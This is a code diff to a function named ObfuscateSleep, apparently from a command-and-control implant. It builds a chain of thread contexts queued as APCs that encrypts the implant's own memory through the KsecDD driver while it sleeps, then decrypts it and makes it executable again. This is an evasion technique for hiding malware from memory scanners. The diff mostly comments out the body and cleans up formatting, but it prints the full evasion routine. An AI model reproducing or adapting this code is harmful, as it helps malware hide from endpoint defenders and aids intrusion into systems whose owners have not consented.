@@ -34,15 +34,17 @@ BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER timeout) {
 // TODO: finish and implement thread stack spoofing along side
 // TODO: modify with shubakki's pivoting technique: https://sillywa.re/posts/flower-da-flowin-shc/
 
+    bool success = true;
     Timeout(RandomSleepTime());
 
+    /*
     BOOL                success     = true;
-    CLIENT_ID           src_cid     = { };
     LPWSTR              ksec_name   = L"\\Device\\KsecDD";
     UNICODE_STRING      ksec_uni    = { };
     IO_STATUS_BLOCK     iostat      = { };
+    CLIENT_ID           src_cid     = { };
     OBJECT_ATTRIBUTES   src_object  = { };
-    OBJECT_ATTRIBUTES   ksec_object  = { };
+    OBJECT_ATTRIBUTES   ksec_object = { };
 
     PVOID       target_region = { };
     PVOID       resume_ptr = { };
@@ -79,15 +81,15 @@ BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER timeout) {
     resume_ptr = C_PTR(Ctx->base.address);
     resume_len = Ctx->base.size;
 
-    AddValidCallTarget(C_PTR(Ctx->nt.NtContinue));
-    AddValidCallTarget(C_PTR(Ctx->nt.NtTestAlert));
-    AddValidCallTarget(C_PTR(Ctx->nt.NtDelayExecution));
-    AddValidCallTarget(C_PTR(Ctx->nt.NtGetContextThread));
-    AddValidCallTarget(C_PTR(Ctx->nt.NtSetContextThread));
-    AddValidCallTarget(C_PTR(Ctx->nt.NtWaitForSingleObject));
-    AddValidCallTarget(C_PTR(Ctx->nt.NtDeviceIoControlFile));
-    AddValidCallTarget(C_PTR(Ctx->nt.NtProtectVirtualMemory));
-    AddValidCallTarget(C_PTR(Ctx->win32.ExitThread));
+    x_assertb(AddValidCallTarget(C_PTR(Ctx->nt.NtContinue)));
+    x_assertb(AddValidCallTarget(C_PTR(Ctx->nt.NtTestAlert)));
+    x_assertb(AddValidCallTarget(C_PTR(Ctx->nt.NtDelayExecution)));
+    x_assertb(AddValidCallTarget(C_PTR(Ctx->nt.NtGetContextThread)));
+    x_assertb(AddValidCallTarget(C_PTR(Ctx->nt.NtSetContextThread)));
+    x_assertb(AddValidCallTarget(C_PTR(Ctx->nt.NtWaitForSingleObject)));
+    x_assertb(AddValidCallTarget(C_PTR(Ctx->nt.NtDeviceIoControlFile)));
+    x_assertb(AddValidCallTarget(C_PTR(Ctx->nt.NtProtectVirtualMemory)));
+    x_assertb(AddValidCallTarget(C_PTR(Ctx->win32.ExitThread)));
 
     src_object.Length = sizeof(src_object);
     ksec_object.Length = sizeof(ksec_object);
@@ -151,21 +153,6 @@ BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER timeout) {
     x_ntassertb(Ctx->nt.NtQueueApcThread(rop_thread, (PPS_APC_ROUTINE) Ctx->nt.NtContinue, rop_set, nullptr, nullptr));
     rop_enc = (CONTEXT*) Malloc(sizeof(CONTEXT));
 
-    /*
-    __kernel_entry NTSTATUS NtDeviceIoControlFile(
-        [in]  HANDLE           FileHandle,
-        [in]  HANDLE           Event,
-        [in]  PIO_APC_ROUTINE  ApcRoutine,
-        [in]  PVOID            ApcContext,
-        [out] PIO_STATUS_BLOCK IoStatusBlock,
-        [in]  ULONG            IoControlCode,
-        [in]  PVOID            InputBuffer,
-        [in]  ULONG            InputBufferLength,
-        [out] PVOID            OutputBuffer,
-        [in]  ULONG            OutputBufferLength
-    );
-    */
-
     *rop_enc = *stolen;
     rop_enc->ContextFlags = CONTEXT_FULL;
     rop_enc->Rsp          = U_PTR(stolen->Rsp - 0x2000);
@@ -183,7 +170,7 @@ BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER timeout) {
     *(uintptr_t*)(rop_enc->Rsp + 0x48) = (uintptr_t) target_region;
     *(uintptr_t*)(rop_enc->Rsp + 0x50) = (uintptr_t) (ContextMemLen + 0x1000 - 1) &~ (0x1000 - 1);
 
-    x_ntassertb(Ctx->nt.NtQueueApcThread(rop_thread, (PPS_APC_ROUTINE) Ctx->nt.NtContinue, rop_enc, NULL, NULL));
+    x_ntassertb(Ctx->nt.NtQueueApcThread(rop_thread, (PPS_APC_ROUTINE) Ctx->nt.NtContinue, rop_enc, nullptr, nullptr));
     context_cap = (CONTEXT*) Malloc(sizeof(CONTEXT));
     cap_mem     = (CONTEXT*) Malloc(sizeof(CONTEXT));
 
@@ -197,7 +184,7 @@ BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER timeout) {
 
     *(uintptr_t*)(context_cap->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert;
 
-    x_ntassertb(Ctx->nt.NtQueueApcThread(rop_thread, (PPS_APC_ROUTINE)Ctx->nt.NtContinue, context_cap, NULL, NULL));
+    x_ntassertb(Ctx->nt.NtQueueApcThread(rop_thread, (PPS_APC_ROUTINE)Ctx->nt.NtContinue, context_cap, nullptr, nullptr));
     context_set = (CONTEXT*) Malloc(sizeof(CONTEXT));
 
     *context_set = *stolen;
@@ -209,7 +196,7 @@ BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER timeout) {
 
     *(uintptr_t*)(context_set->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert;
 
-    x_ntassertb(Ctx->nt.NtQueueApcThread(rop_thread, (PPS_APC_ROUTINE)Ctx->nt.NtContinue, context_set, NULL, NULL));
+    x_ntassertb(Ctx->nt.NtQueueApcThread(rop_thread, (PPS_APC_ROUTINE)Ctx->nt.NtContinue, context_set, nullptr, nullptr));
     rop_del = (CONTEXT*) Malloc(sizeof(CONTEXT));
 
 //
@@ -231,7 +218,7 @@ BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER timeout) {
 
     *(uintptr_t*)(rop_del->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert;
 
-    x_ntassertb(Ctx->nt.NtQueueApcThread(rop_thread, (PPS_APC_ROUTINE)Ctx->nt.NtContinue, rop_del, NULL, NULL));
+    x_ntassertb(Ctx->nt.NtQueueApcThread(rop_thread, (PPS_APC_ROUTINE) Ctx->nt.NtContinue, rop_del, nullptr, nullptr));
 
 //
 // WAIT FUNCTION ENDS HERE
@@ -252,11 +239,11 @@ BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER timeout) {
     *(uintptr_t*)(rop_dec->Rsp + 0x28) = (uintptr_t) &iostat;
     *(uintptr_t*)(rop_dec->Rsp + 0x30) = (uintptr_t) IOCTL_KSEC_DECRYPT_MEMORY;
     *(uintptr_t*)(rop_dec->Rsp + 0x38) = (uintptr_t) target_region;
-    *(uintptr_t*)(rop_dec->Rsp + 0x40) = (uintptr_t) ( ContextMemLen + 0x1000 - 1 ) &~ ( 0x1000 - 1 );
+    *(uintptr_t*)(rop_dec->Rsp + 0x40) = (uintptr_t) (ContextMemLen + 0x1000 - 1) & ~(0x1000 - 1);
     *(uintptr_t*)(rop_dec->Rsp + 0x48) = (uintptr_t) target_region;
-    *(uintptr_t*)(rop_dec->Rsp + 0x50) = (uintptr_t) ( ContextMemLen + 0x1000 - 1 ) &~ ( 0x1000 - 1 );
+    *(uintptr_t*)(rop_dec->Rsp + 0x50) = (uintptr_t) (ContextMemLen + 0x1000 - 1) & ~(0x1000 - 1);
 
-    x_ntassertb(Ctx->nt.NtQueueApcThread(rop_thread, (PPS_APC_ROUTINE)Ctx->nt.NtContinue, rop_dec, NULL, NULL));
+    x_ntassertb(Ctx->nt.NtQueueApcThread(rop_thread, (PPS_APC_ROUTINE)Ctx->nt.NtContinue, rop_dec, nullptr, nullptr));
     context_res = (CONTEXT*) Malloc(sizeof(CONTEXT));
 
     *context_res = *stolen;
@@ -268,22 +255,22 @@ BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER timeout) {
 
     *(uintptr_t*)(context_res->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert;
 
-    x_ntassertb(Ctx->nt.NtQueueApcThread(rop_thread, (PPS_APC_ROUTINE)Ctx->nt.NtContinue, context_res, NULL, NULL));
+    x_ntassertb(Ctx->nt.NtQueueApcThread(rop_thread, (PPS_APC_ROUTINE)Ctx->nt.NtContinue, context_res, nullptr, nullptr));
     rop_res = (CONTEXT*) Malloc(sizeof(CONTEXT));
 
     *rop_res = *stolen;
     rop_res->ContextFlags = CONTEXT_FULL;
-    rop_res->Rsp          = U_PTR( stolen->Rsp - 0x1000 );
-    rop_res->Rip          = U_PTR( Ctx->nt.NtProtectVirtualMemory );
-    rop_res->Rcx          = U_PTR( NtCurrentProcess() );
-    rop_res->Rdx          = U_PTR( &resume_ptr );
-    rop_res->R8           = U_PTR( &resume_len );
+    rop_res->Rsp          = U_PTR(stolen->Rsp - 0x1000);
+    rop_res->Rip          = U_PTR(Ctx->nt.NtProtectVirtualMemory);
+    rop_res->Rcx          = U_PTR(NtCurrentProcess());
+    rop_res->Rdx          = U_PTR(&resume_ptr);
+    rop_res->R8           = U_PTR(&resume_len);
     rop_res->R9           = PAGE_EXECUTE_READWRITE;
 
     *(uintptr_t*)(rop_res->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert ;
     *(uintptr_t*)(rop_res->Rsp + 0x28) = (uintptr_t) &ContextResPrt;
 
-    x_ntassertb(Ctx->nt.NtQueueApcThread(rop_thread, (PPS_APC_ROUTINE)Ctx->nt.NtContinue, rop_res, NULL, NULL));
+    x_ntassertb(Ctx->nt.NtQueueApcThread(rop_thread, (PPS_APC_ROUTINE)Ctx->nt.NtContinue, rop_res, nullptr, nullptr));
     rop_ext = (CONTEXT*) Malloc(sizeof(CONTEXT));
 
     *rop_ext = *stolen;
@@ -294,9 +281,9 @@ BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER timeout) {
 
     *(uintptr_t*)(rop_ext->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert;
 
-    x_ntassertb(Ctx->nt.NtQueueApcThread(rop_thread, (PPS_APC_ROUTINE)Ctx->nt.NtContinue, rop_ext, NULL, NULL));
+    x_ntassertb(Ctx->nt.NtQueueApcThread(rop_thread, (PPS_APC_ROUTINE)Ctx->nt.NtContinue, rop_ext, nullptr, nullptr));
     x_ntassertb(Ctx->nt.NtAlertResumeThread(rop_thread, &success_count));
-    x_ntassertb(Ctx->nt.NtSignalAndWaitForSingleObject(sync_event, rop_thread, true, NULL));
+    x_ntassertb(Ctx->nt.NtSignalAndWaitForSingleObject(sync_event, rop_thread, true, nullptr));
 
     defer:
     if (rop_dec)        { Free(rop_dec); }
@@ -314,12 +301,13 @@ BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER timeout) {
 
     if (rop_thread) {
         Ctx->nt.NtTerminateThread(rop_thread, ERROR_SUCCESS);
-        Ctx->nt.NtClose( rop_thread );
+        Ctx->nt.NtClose(rop_thread);
     }
 
-    if (src_thread) { Ctx->nt.NtClose(src_thread); }
-    if (sync_event) { Ctx->nt.NtClose(sync_event); }
-    if (ksec_handle)     { Ctx->nt.NtClose(ksec_handle); }
+    if (src_thread)     { Ctx->nt.NtClose(src_thread); }
+    if (sync_event)     { Ctx->nt.NtClose(sync_event); }
+    if (ksec_handle)    { Ctx->nt.NtClose(ksec_handle); }
 
+*/
     return success;
 };
